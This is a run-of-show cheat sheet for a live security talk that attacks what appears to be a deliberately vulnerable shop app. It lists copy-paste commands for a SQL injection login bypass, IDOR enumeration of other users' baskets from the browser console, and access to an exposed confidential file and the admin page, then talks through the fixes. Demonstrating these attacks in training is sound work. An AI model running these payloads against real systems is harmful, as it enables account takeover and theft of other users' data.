# Demo Run-of-Show Cheat Sheet

Copy-paste commands for the live demo, in order, tagged by environment.
Scope: **three live exploits**, then talk through the fixes. The hardened state
is **described, not run live** (see Slides 12–13), so there are no cluster changes
to make and no NetworkPolicy enforcement to enable.

```
================================================================
  UPWIND DEMO — RUN-OF-SHOW CHEAT SHEET
  Env tags:  [PS] PowerShell   [BROWSER] address bar/UI
             [DEVTOOLS] browser F12 Console   [SLIDE] just talk
================================================================

LB URL (re-fetch if you rebuilt the cluster):
  http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com

----------------------------------------------------------------
PRE-DEMO (do BEFORE you present — not on stage)
----------------------------------------------------------------

[PS] Set the URL variable for the session:
  $JUICE = "http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com"

[PS] Confirm app is up (expect HTTP 200):
  curl.exe -s -o NUL -w "%{http_code}`n" $JUICE

Open browser to $JUICE, keep DevTools (F12) on the Network tab.
Have a backup screen recording of each exploit ready.

----------------------------------------------------------------
SLIDE 7  —  VULN 1: A03 INJECTION  (SQLi auth bypass)   ~4 min
----------------------------------------------------------------

[BROWSER] On the Login page, enter:
  Email:    ' OR 1=1--
  Password: anything
  -> logs in as admin (first user in table)

[PS] Same thing raw, to show the request (returns an admin token).
     NOTE: build JSON from an object so the quote isn't doubled:
  $body = @{ email = "' OR 1=1--"; password = "x" } | ConvertTo-Json
  Invoke-RestMethod -Uri "$JUICE/rest/user/login" -Method Post -ContentType 'application/json' -Body $body

ATTACKER GAINS: full admin session, no credentials. A UNION payload
dumps arbitrary tables -> full DB read.

----------------------------------------------------------------
SLIDE 9  —  VULN 2: A01 BROKEN ACCESS CONTROL  (IDOR)   ~4 min
----------------------------------------------------------------

Log in as a NORMAL throwaway user first (Account > Register, or
demo@demo.com / demo123) so the point is horizontal access.

BEAT 1 — API leaks raw data:
[DEVTOOLS] (Console, on the $JUICE tab):
  let t = localStorage.getItem('token'); try { t = JSON.parse(t); } catch (e) {}
  fetch('/rest/basket/1', { headers: { Authorization: 'Bearer ' + t } }).then(r => r.json()).then(console.log);
  -> expand result: products + a UserId that isn't yours.
  Change '1' to '2' and re-run to show enumeration.
  (Baskets 1-6 are populated; basket 1 = admin, 3 items. 7+ empty.)

BEAT 2 — the app renders someone else's cart:
[DEVTOOLS] (Console):
  sessionStorage.setItem('bid', '1');
  -> then click "Your Basket" / reload. UI shows basket 1's items.
  (If sessionStorage bid is null, use: localStorage.setItem('bid','1'))

ATTACKER GAINS: enumerable across all users = bulk PII / order-data
harvest, not one cart. Points to the same missing check on orders,
addresses, payment -> and possibly write operations (fraud).

----------------------------------------------------------------
SLIDE 11 —  VULN 3: A05 SECURITY MISCONFIG              ~3 min
----------------------------------------------------------------

[BROWSER] Confidential file, no auth needed (paste in address bar):
  http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com/ftp/acquisitions.md

[BROWSER] Admin surface (be logged in as admin from Vuln 1 so it
          POPULATES; anonymous gets bounced by the client-side guard):
  http://a759ede5a033d4421b00bdd107863390-1869063510.us-east-1.elb.amazonaws.com/#/administration

ATTACKER GAINS: info disclosure (internal docs/config) + privileged
screens. Misconfig is usually the first foothold that chains into
the rest.

----------------------------------------------------------------
SLIDES 12-13 —  FIXES + HARDENING                       ~6 min
----------------------------------------------------------------

TALK ONLY — no live commands. Walk the three-column frame (In the app
/ Around it / Watching for it) from the slides. For each exploit give
the real fix:
  A03 Injection      -> parameterized queries (app); WAF + egress limits.
  A01 Access control -> per-object ownership checks (code; infra can't
                        fix logic — the honest "platform can't save you").
  A05 Misconfig      -> prod config, delete sample files, gate admin;
                        THIS is where k8s earns its keep (PSA restricted,
                        non-root, read-only FS, drop caps, default-deny).

Thesis: the app bug survives hardening, but the blast radius shrinks —
a foothold can't exfiltrate, escalate, or move laterally. Assume bugs;
constrain and detect at runtime.

================================================================
GOTCHAS
- SQLi from PowerShell: build JSON from an object (@{..} | ConvertTo-Json)
  or the single quote gets doubled and you get a 401.
- IDOR token in localStorage is quote-wrapped -> JSON.parse unwraps it,
  or you send "Bearer \"eyJ...\"" and get a token error.
- Admin page (#/administration) only populates if logged in as admin.
- Register the IDOR user BEFORE you need it; new users start empty, so
  read the lower ids (1-6), which belong to seeded users.
================================================================
```
